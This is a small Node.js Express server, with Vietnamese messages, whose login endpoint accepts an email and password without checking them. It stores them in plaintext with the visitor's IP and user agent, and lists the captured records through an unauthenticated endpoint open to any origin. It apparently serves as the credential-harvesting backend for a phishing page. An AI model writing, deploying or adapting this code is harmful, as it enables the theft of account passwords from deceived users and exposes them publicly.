const express = require("express");
const path = require("path");
const fs = require("fs");

const PORT = process.env.PORT || 3001;
const app = express();
app.set("trust proxy", 1);

const dataDir = path.join(__dirname, "data");
const DB_FILE = path.join(dataDir, "logins.json");

if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "[]", "utf8");

function readLogins() {
  try {
    return JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
  } catch {
    return [];
  }
}

function writeLogins(rows) {
  fs.writeFileSync(DB_FILE, JSON.stringify(rows, null, 2), "utf8");
}

function addLogin(record) {
  const rows = readLogins();
  const id = rows.length ? Math.max(...rows.map((r) => r.id)) + 1 : 1;
  const row = {
    id,
    email: record.email,
    password: record.password,
    user_agent: record.user_agent || "",
    ip: record.ip || "",
    created_at: new Date().toLocaleString("vi-VN", { hour12: false }),
  };
  rows.unshift(row);
  writeLogins(rows);
  return row;
}

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});
app.use(express.static(__dirname));

app.post("/api/login", (req, res) => {
  const email = String(req.body?.email || "").trim();
  const password = String(req.body?.password || "");

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Thiếu email hoặc mật khẩu" });
  }

  try {
    const row = addLogin({
      email,
      password,
      user_agent: req.get("user-agent") || "",
      ip: req.ip || req.socket?.remoteAddress || "",
    });

    console.log(`[LƯU] id=${row.id} | ${email}`);
res.json({ ok: true, id: row.id });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, message: "Lỗi server" });
  }
});

app.get("/api/logins", (_req, res) => {
  const rows = readLogins().slice(0, 100);
  res.json({ ok: true, data: rows });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server chạy cổng ${PORT}`);
});
